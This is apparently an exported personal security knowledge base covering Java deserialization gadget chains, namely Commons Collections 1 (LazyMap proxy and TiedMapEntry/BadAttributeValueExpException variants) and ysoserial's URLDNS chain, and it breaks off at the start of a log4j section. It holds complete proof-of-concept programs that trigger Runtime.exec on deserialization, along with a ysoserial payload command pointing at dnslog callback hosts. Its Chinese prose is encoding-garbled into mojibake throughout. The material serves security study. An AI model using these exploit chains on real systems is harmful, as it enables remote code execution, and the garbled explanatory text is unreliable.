åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œæ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œéƒ½ä¼šåˆ°invokeä¸­å» ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬å…¥å£ç‚¹æ˜¯ sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ï¼ˆæˆ‘ä»¬éœ€è¦çš„æ˜¯AnnotationInvocationHandlerè¿™ä¸ªç±»çš„å¯¹è±¡ï¼‰ // åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå®ä¾‹ï¼Œå¹¶ä¸”æŠŠåˆšåˆšåˆ›å»ºçš„ä»£ç†èµ‹å€¼ç»™this.memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); // readObjectçš„æ—¶å€™ä¸»åŠ¨è°ƒç”¨proxyMapçš„æ–¹æ³•è¿›å…¥åˆ°invokeä¸­ å®Œæ•´POC package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { System.out.println(String.class.isInstance(\"\")); // åˆ©ç”¨é“¾ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // æ„å»ºå¯¹è±¡ Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // ä»£ç†å¯¹è±¡ handler = (InvocationHandler) constructor.newInstance(Action.class, proxyMap); // åŒ…è£¹ // åºåˆ—åŒ– ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(handler); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // ååºåˆ—åŒ– ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } LazyMapåˆ©ç”¨é“¾è¡¥å…… ä¸Šé¢çš„åˆ©ç”¨é“¾å—é™äºjdk1.7ç‰ˆæœ¬ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹å¦å¤–ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œè¿™æ¡åˆ©ç”¨é“¾ä¸æ˜¯ç”¨åŠ¨æ€ä»£ç†çš„æ–¹å¼è§¦å‘äº† ä»ä¸Šä¸€æ¡åˆ©ç”¨é“¾æˆ‘ä»¬å·²ç»çŸ¥é“LazyMapç±»çš„getæ–¹æ³•ä¸­è°ƒç”¨äº†transformæ–¹æ³•ï¼Œé‚£ä¹ˆé™¤äº†AnnotationInvocationHandlerçš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•å¤–ï¼Œè¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„åœ°æ–¹ä¹Ÿè°ƒç”¨äº†getæ–¹æ³•å‘¢?å½“ç„¶æœ‰ï¼ŒTiedMapEntryç±»çš„getValueæ–¹æ³•ä¹Ÿè°ƒç”¨äº†getæ–¹æ³• è€Œä¸”this.mapæˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬æœ€ç»ˆè¦æ‰¾çš„è¿˜æ˜¯readObjectæ–¹æ³•ä¸­çš„è§¦å‘ç‚¹ï¼Œæ‰€ä»¥ç»§ç»­ç½‘ä¸Šæ‰¾ï¼Œçœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†TiedMapEntryçš„getValueæ–¹æ³•ï¼Œæ‰¾åˆ°TiedMapEntryç±»çš„toStringæ–¹æ³•ï¼š public String toString() { return this.getKey() + \"=\" + this.getValue(); } toStringæ–¹æ³•åœ¨è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥æˆ–è€…æ‰‹åŠ¨æŠŠæŸä¸ªç±»è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™ä¼šè¢«è°ƒç”¨ï¼Œæ‰€ä»¥ï¼Œç°åœ¨æˆ‘ä»¬æ‰¾æ‰¾æŠŠTiedMapEntryçš„å¯¹è±¡å½“åšå­—ç¬¦ä¸²å¤„ç†çš„åœ°æ–¹ï¼Œæ‰¾åˆ°äº†BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•ä¸­æœ‰ç›¸å…³è°ƒç”¨ï¼š å¯ä»¥çœ‹åˆ°ç¬¬ä¸‰ä¸ªifåˆ†æ”¯é‡Œè°ƒç”¨äº†valObj.toString(),è€ŒvalObj=gf.get(\"val\", null),è¿™é‡Œå…¶å®å°±æ˜¯è¯»å–ä¼ è¿‡æ¥å¯¹è±¡çš„valå±æ€§å€¼ï¼Œæ‰€ä»¥ï¼Œåªè¦æˆ‘ä»¬æ§åˆ¶BadAttributeValueExpExceptionå¯¹è±¡çš„valå±æ€§çš„å€¼ä¸ºæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„TiedMapEntryå¯¹è±¡å°±è¡Œã€‚æ‰€ä»¥ï¼Œå°±æœ‰äº†ä¸‹é¢çš„poc: package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.*; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException { System.out.println(String.class.isInstance(\"\")); // åˆ©ç”¨é“¾ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"123\", 1); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); // å°†lazyMapå°è£…åˆ°TiedMapEntryä¸­ TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"456\"); // é€šè¿‡åå°„ç»™badAttributeValueExpExceptionçš„valå±æ€§èµ‹å€¼ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Field val = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); // åºåˆ—åŒ– ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(badAttributeValueExpException); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // æ¨¡æ‹Ÿç›®æ ‡è¿›è¡Œååºåˆ—åŒ– ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } å‚è€ƒ Apache-Commons-Collectionsååºåˆ—åŒ–æ¼æ´åˆ†æ Javaå®‰å…¨ä¹‹Commons Collections1åˆ†æå‰ç½®çŸ¥è¯† Javaå®‰å…¨å­¦ä¹ ä¹‹ysoserial CommonsCollections1è¯¦ç»†åˆ†æ java-cc1-ååºåˆ—åŒ–ç®€å•åˆ†æ JAVAååºåˆ—åŒ– - Commons-Collectionsç»„ä»¶ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/02.URLDNSé“¾åˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/02.URLDNSé“¾åˆ†æ.html","title":"02.URLDNSé“¾åˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 URLDNSé“¾åˆ©ç”¨ åŠ¨æ€è°ƒè¯•ysoserial URLDNSé“¾åˆ†æ æ€è€ƒ æ€»ç»“ URLDNSé“¾åˆ©ç”¨ å…ˆæ¥çœ‹çœ‹ç”¨ysoserialå·¥å…·æ€ä¹ˆåˆ©ç”¨çš„ã€‚ # ç”Ÿæˆåºåˆ—åŒ–Payload java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn/ > a.ser ç„¶åå°†åºåˆ—åŒ–payloadå‘ç»™å¯¹åº”çš„ç›®æ ‡ç»“åˆæ¼æ´è®©ä»–è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™é‡Œæœ¬åœ°ç›´æ¥å†™ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ä¸¾ä¾‹äº†ï¼› package org.example; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"/Users/d4m1ts/d4m1ts/tools/java/ysoserial/target/a.ser\")); objectInputStream.readObject(); } } DNSLogæˆåŠŸæ”¶åˆ°äº†è¯·æ±‚ åŠ¨æ€è°ƒè¯•ysoserial ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯ç»™ysoserialé¡¹ç›®åŠ è½½åˆ°ideaä¸­ï¼Œæ–¹ä¾¿æˆ‘ä»¬åˆ†æè°ƒè¯•ã€‚ ä¸‹è½½ysoserialé¡¹ç›®åï¼Œå¯¼å…¥åˆ°ideaä¸­ï¼Œè§£å†³æ‰ä¾èµ–é—®é¢˜ æœ‰çš„ä¾èµ–ä¸€ç›´è£…ä¸ä¸Šï¼Œå¯ä»¥æ–°å»ºä¸ªmavené¡¹ç›®ï¼Œç„¶åå†ç»™ä¸èƒ½ä¸‹è½½çš„ä¾èµ–æ”¾åˆ°pom.xmlï¼Œä¸‹è½½åè¯´ä¸å®šå¯ä»¥è§£å†³ã€‚ å®åœ¨ä¸è¡Œå°±æ‰‹åŠ¨ä¸‹è½½jarç„¶åå¯¼å…¥å§ ideaä¼šè‡ªåŠ¨è¯†åˆ«ysoserialçš„ä¸»ç±»ysoserial.GeneratePayloadï¼Œç„¶åç›´æ¥è¿è¡Œé¡¹ç›®å³å¯ï¼›æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡pom.xmlæ–‡ä»¶çš„mainClasså±æ€§çœ‹åˆ°ä¸»ç±»ï¼Œå¦‚æœæ­£å¸¸æ˜¾ç¤ºysoserialçš„ç”¨æ³•ï¼Œå°±è¯´æ˜é¡¹ç›®éƒ¨ç½²æˆåŠŸäº†ã€‚ å› ä¸ºysoserialç”Ÿæˆpayloadéœ€è¦ä¼ å…¥å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨é…ç½®ä¸€ä¸‹é¡¹ç›®ï¼Œä¼ å…¥å‚æ•° Run --> Edit Configurations... ç„¶ååœ¨Program argumentsè¾“å…¥å¯¹åº”çš„å‚æ•° å†æ¬¡è¿è¡Œ ç”Ÿæˆäº†åºåˆ—åŒ–æ•°æ®ï¼Œè¯´æ˜ä¸€åˆ‡è¿è¡ŒæˆåŠŸï¼Œå°±å¯ä»¥ç”¨ideaå¼€å§‹åŠ¨æ€è°ƒè¯•äº†ã€‚ URLDNSé“¾åˆ†æ URLDNSæ˜¯ysoserialé‡Œé¢å°±ç®€å•çš„ä¸€æ¡åˆ©ç”¨é“¾ï¼Œä½†URLDNSçš„åˆ©ç”¨æ•ˆæœæ˜¯åªèƒ½è§¦å‘ä¸€æ¬¡dnsè¯·æ±‚ï¼Œè€Œä¸èƒ½å»æ‰§è¡Œå‘½ä»¤ã€‚æ¯”è¾ƒé€‚ç”¨äºæ¼æ´éªŒè¯è¿™ä¸€å—ï¼Œå°¤å…¶æ˜¯æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œä¸”URLDNSè¿™æ¡åˆ©ç”¨é“¾å¹¶ä¸ä¾èµ–äºç¬¬ä¸‰æ–¹çš„ç±»ï¼Œè€Œæ˜¯JDKä¸­å†…ç½®çš„ä¸€äº›ç±»å’Œæ–¹æ³•ã€‚ æ‰“å¼€ysoserial/payloads/URLDNS.javaçš„æºç ï¼Œå¯ä»¥çœ‹åˆ°å®ƒçš„è°ƒç”¨é“¾ * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() è¿™æ ·çœ‹è¿˜æ˜¯æœ‰ç‚¹ä¸ç‰¹åˆ«æ˜ç™½ï¼Œè°ƒè¯•åˆ†æçœ‹çœ‹ã€‚ æ¨¡æ‹Ÿå¯¹åºåˆ—åŒ–åçš„seræ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Œç„¶ååˆ†ææ•´ä¸ªè¿‡ç¨‹ï¼Œååºåˆ—åŒ–ä»£ç å¦‚ä¸‹ï¼ˆç¬¬ä¸€èŠ‚ä¸­çš„ååºåˆ—åŒ–ä»£ç ï¼‰ï¼š æ ¹æ®ä¸Šè¿°çš„Gadget Chainï¼Œå¯è§è§¦å‘ç‚¹æ˜¯åœ¨HashMap.readObject()ï¼Œä¸ºäº†èŠ‚çº¦æ—¶é—´ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨HashMap.readObject()å¤„ä¸‹æ–­ç‚¹ã€‚ è¿è¡Œä¸»ç¨‹åºå¼€å§‹ååºåˆ—åŒ–ï¼Œè‡ªåŠ¨åœ¨æˆ‘ä»¬ä¸‹æ–­ç‚¹çš„åœ°æ–¹æš‚åœã€‚ ç„¶åä¸€ç›´F8 æ ¹æ®Gadget Chainå‘ç°ä½¿ç”¨äº†putValæ–¹æ³•ï¼Œä½†è¿™ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯ä¼šè°ƒç”¨hashæ–¹æ³• è·Ÿè¿›hashæ–¹æ³• å¦‚æœkeyä¸æ˜¯nullå°±ä¼šè°ƒç”¨key.hashCodeæ–¹æ³•ï¼Œè·Ÿè¿›hashCodeæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨çš„æ˜¯URLç±»ä¸­çš„hashCodeæ–¹æ³• å½“hashCodeå±æ€§ä¸ä¸º-1æ—¶å°±ç›´æ¥returnï¼Œå°±ä¸ä¼šè§¦å‘hashCodeæ–¹æ³•ï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘æ¥ä¸‹æ¥çš„DNSè§£æ è¿™é‡ŒhashCodeå€¼é»˜è®¤ä¸º -1ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œ handler.hashCode(this); URLDNSé“¾ä¸­ä¹Ÿé€šè¿‡åå°„å°†hashCodeçš„å€¼è®¾ç½®ä¸º-1 è·Ÿä¸€ä¸‹handlerï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆç©æ„å„¿ æ˜¯URLStreamHandlerç±»ï¼ˆä¹Ÿæ˜¯æˆ‘ä»¬ä¼ å…¥çš„handlerï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè°ƒç”¨çš„æ˜¯URLStreamHandler.hashCode è·Ÿè¿›hashCodeæ–¹æ³•ï¼Œå‘ç°ä¼šè°ƒç”¨getHostAddressæ–¹æ³•å¯¹ä¼ å…¥çš„URLå¯¹è±¡è¿›è¡Œè§£æ è·Ÿè¿›getHostAddressæ–¹æ³•ï¼Œå‘ç°ä¼šè°ƒç”¨getHostæ–¹æ³•ï¼Œç„¶åè°ƒç”¨InetAddress.getByName(host)å‘èµ·DNSè¯·æ±‚ï¼Œè‡³æ­¤æ•´ä¸ªè¿‡ç¨‹å®Œæ¯•ã€‚ æ€è€ƒ åˆ†æè¿‡ç¨‹ä¸­ï¼Œå‘ç°HashMap.putæ–¹æ³•ä¸­ä¹Ÿè°ƒç”¨äº†hashæ–¹æ³•ï¼Œç„¶åå»è¿›è¡ŒhashCodeè®¡ç®—ç­‰ã€‚ é‚£ä¹ˆå°±æ˜¯è¯´ï¼Œåœ¨putæ“ä½œçš„æ—¶å€™ï¼Œä¹Ÿä¼šè§¦å‘å¯¹åº”çš„dnsè§£æï¼Œè¯•è¯•çœ‹ã€‚ package org.example; import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { HashMap map = new HashMap(); URL url = new URL(\"http://cgu44y.dnslog.cn/\"); map.put(url, 2); } } æˆåŠŸè·å–åˆ°äº†DNSè§£æè¯·æ±‚è®°å½•ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆysoserialåœ¨ç”Ÿæˆåºåˆ—åŒ–æ•°æ®çš„æ—¶å€™ï¼Œä¹Ÿè°ƒç”¨äº†putæ–¹æ³•ï¼Œä½†æ˜¯æ²¡æœ‰æ”¶åˆ°DNSè§£æè®°å½•å‘¢ï¼Ÿ åŸå› å°±åœ¨äºç»§æ‰¿æŠ½è±¡ç±»URLStreamHandlerçš„SilentURLStreamHandlerç±»ä¸­ï¼Œé‡å†™äº†openConnectionå’ŒgetHostAddress å› æ­¤åœ¨è°ƒç”¨ put æ–¹æ³•çš„æ—¶å€™ä¸ä¼šè§¦å‘ dns æŸ¥è¯¢ã€‚ è¿›è¡Œå°è¯•é‡å†™äº†openConnectionå’ŒgetHostAddressï¼Œå‘ç°ç¡®å®ä¸èƒ½æ”¶åˆ°dnsæŸ¥è¯¢è®°å½•ã€‚ package org.example; import java.io.IOException; import java.net.*; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { URLStreamHandler urlStreamHandler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } @Override protected synchronized InetAddress getHostAddress(URL u){ return null; } }; HashMap map = new HashMap(); URL url = new URL(null, \"http://qyd9tm.dnslog.cn/\", urlStreamHandler); map.put(url, 2); } } é‚£è¿™æ ·æˆ‘ä»¬ååºåˆ—åŒ–çš„æ—¶å€™ä¸æ˜¯ä¹Ÿå› ä¸ºé‡å†™äº†æ–¹æ³•è€Œä¸èƒ½è¿›è¡Œ dns æŸ¥è¯¢å—ï¼Ÿ åŸå› åœ¨äº URL é‡Œé¢çš„ handler è®¾ç½®çš„æ˜¯ transient æˆ‘ä»¬éƒ½çŸ¥é“ä¸€ä¸ªå¯¹è±¡åªè¦å®ç°äº†Serilizableæ¥å£ï¼Œè¿™ä¸ªå¯¹è±¡å°±å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œjavaçš„è¿™ç§åºåˆ—åŒ–æ¨¡å¼ä¸ºå¼€å‘è€…æä¾›äº†å¾ˆå¤šä¾¿åˆ©ï¼Œæˆ‘ä»¬å¯ä»¥ä¸å¿…å…³ç³»å…·ä½“åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œåªè¦è¿™ä¸ªç±»å®ç°äº†Serilizableæ¥å£ï¼Œè¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•éƒ½ä¼šè‡ªåŠ¨åºåˆ—åŒ–ã€‚ ç„¶è€Œåœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šé‡åˆ°è¿™æ ·çš„é—®é¢˜ï¼Œè¿™ä¸ªç±»çš„æœ‰äº›å±æ€§éœ€è¦åºåˆ—åŒ–ï¼Œè€Œå…¶ä»–å±æ€§ä¸éœ€è¦è¢«åºåˆ—åŒ–ï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœä¸€ä¸ªç”¨æˆ·æœ‰ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç ï¼Œé“¶è¡Œå¡å·ç­‰ï¼‰ï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼Œä¸å¸Œæœ›åœ¨ç½‘ç»œæ“ä½œï¼ˆä¸»è¦æ¶‰åŠåˆ°åºåˆ—åŒ–æ“ä½œï¼Œæœ¬åœ°åºåˆ—åŒ–ç¼“å­˜ä¹Ÿé€‚ç”¨ï¼‰ä¸­è¢«ä¼ è¾“ï¼Œè¿™äº›ä¿¡æ¯å¯¹åº”çš„å˜é‡å°±å¯ä»¥åŠ ä¸Štransientå…³é”®å­—ã€‚ ä¹Ÿå°±æ˜¯è¯´transientä¿®é¥°ç¬¦æ— æ³•è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥è™½ç„¶å®ƒæœ€åæ˜¯æ²¡æ‰§è¡Œdnsè¯·æ±‚ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿˜æ˜¯ä¼šæ‰§è¡Œdnsè¯·æ±‚ æµ‹è¯•ä¸€ä¸‹transient package org.example; import java.io.*; import java.util.Arrays; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { Test test = new Test(); // è®¾ç½®å€¼ test.test = \"Test Value\"; System.out.println(test.test); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(test); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // ååºåˆ—åŒ– ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Test serTest = (Test) objectInputStream.readObject(); System.out.println(serTest.test); } } class Test implements Serializable { transient public String test; } å¯è§ååºåˆ—åŒ–åçš„å€¼ä¸ºnullï¼Œè¯´æ˜åºåˆ—åŒ–æ—¶å¹¶æ²¡æœ‰å°†testå¯¹åº”çš„å€¼ä»£å…¥è¿›å»ã€‚ æ€»ç»“ è¿™æ¡é“¾è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä¸»è¦æ˜¯ååºåˆ—åŒ–è¿‡ç¨‹ä¸­HashMapçš„Keyä¼šè¿›è¡ŒKey.HashCode()è®¡ç®—ï¼Œå¦‚æœKeyä¼ å…¥çš„æ˜¯URL(URL context, String spec, URLStreamHandler handler)ç±»å‹ï¼ˆé‡å†™URLStreamHandleré¿å…æœ‰å¤šä½™çš„DNSè¯·æ±‚ï¼‰ï¼Œåœ¨è®¡ç®—hashCode()çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨URLStreamHandler.hashCode()è§¦å‘getHostæ–¹æ³•å¯¹ç›®æ ‡è¿›è¡ŒDNSè§£æã€‚ ä¸¾ä¸ªä¾‹å­ï¼š package org.example; import java.io.IOException; import java.net.MalformedURLException; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; public class App { public static void main(String[] args) throws MalformedURLException { /* * `URL(URL context, String spec, URLStreamHandler handler)`ç±»å‹ï¼Œåœ¨è®¡ç®—`hashCode()`çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨`URLStreamHandler.hashCode()`è§¦å‘`getHost`æ–¹æ³•å¯¹ç›®æ ‡è¿›è¡ŒDNSè§£æ * */ URLStreamHandler handler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } }; URL url = new URL(null, \"http://k0e09d.dnslog.cn/\", handler); url.hashCode(); // è§¦å‘ç‚¹ } } æ•´ä¸ªè°ƒç”¨é“¾å¦‚ä¸‹ï¼š HashMap.readObject() -> HashMap.putVal() -> HashMap.hash() -> URL.hashCode() -> URLStreamHandler.hashCode().getHostAddress() -> URLStreamHandler.getHostAddress().InetAddress.getByName() URLDNS è¿™ä¸ªåˆ©ç”¨é“¾ä¸»è¦ç”¨æ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæœ‰å¦‚ä¸‹ä¸¤ä¸ªä¼˜ç‚¹ï¼š ä½¿ç”¨java å†…éƒ¨çš„ç±»è¿›è¡Œæ„é€ ï¼Œä¸ä¾èµ–ç¬¬ä¸‰æ–¹åº“ å¦‚æœç›®æ ‡å¯ä»¥å‡ºç½‘ï¼Œåœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/03.log4jååºåˆ—åŒ–æ¼æ´åˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/03.log4jååºåˆ—åŒ–æ¼æ´åˆ†æ.html","title":"03.log4jååºåˆ—åŒ–æ¼æ´åˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ä»‹ç» åŸºç¡€ä½¿ç”¨ pom.xml log4j2.xml Test.java CVE-2017-5645 ç®€ä»‹ ç¯å¢ƒå‡†å¤‡ ç›´æ¥å¤ç° ç¯å¢ƒå¯åŠ¨ æ¼æ´å¤ç° DEBUGåˆ†æ CVE-2019-17571 ç®€ä»‹ ç¯å¢ƒå‡†å¤‡ Debugåˆ†æ å…¶ä»– ä»‹ç» https://logging.apache.org/log4j/2.x/ Log4jæ˜¯Apacheçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œé€šè¿‡ä½¿ç”¨Log4jï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°æ˜¯æ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„ä»¶ï¼Œç”šè‡³æ˜¯å¥—æ¥å£æœåŠ¡å™¨ã€NTçš„äº‹ä»¶è®°å½•å™¨ã€UNIX Syslogå®ˆæŠ¤è¿›ç¨‹ç­‰ï¼›æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶æ¯ä¸€æ¡æ—¥å¿—çš„è¾“å‡ºæ ¼å¼ï¼›é€šè¿‡å®šä¹‰æ¯ä¸€æ¡æ—¥å¿—ä¿¡æ¯çš„çº§åˆ«ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ›´åŠ ç»†è‡´åœ°æ§åˆ¶æ—¥å¿—çš„ç”Ÿæˆè¿‡ç¨‹ã€‚æœ€ä»¤äººæ„Ÿå…´è¶£çš„å°±æ˜¯ï¼Œè¿™äº›å¯ä»¥é€šè¿‡ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥çµæ´»åœ°è¿›è¡Œé…ç½®ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹åº”ç”¨çš„ä»£ç ã€‚ ç®€å•æ¥è¯´ï¼ŒLog4jæ˜¯ä¸€ç§éå¸¸æµè¡Œçš„æ—¥å¿—æ¡†æ¶ï¼Œæœ€æ–°ç‰ˆæœ¬æ˜¯2.xï¼›ä¹Ÿæ˜¯ä¸€ä¸ªç»„ä»¶åŒ–è®¾è®¡çš„æ—¥å¿—ç³»ç»Ÿï¼Œå®ƒçš„æ¶æ„å¤§è‡´å¦‚ä¸‹ï¼š log.info(\"User signed in.\"); â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”œâ”€â”€>â”‚ Appender â”‚â”€â”€â”€>â”‚ Filter â”‚â”€â”€â”€>â”‚ Layout â”‚â”€â”€â”€>â”‚ Console â”‚ 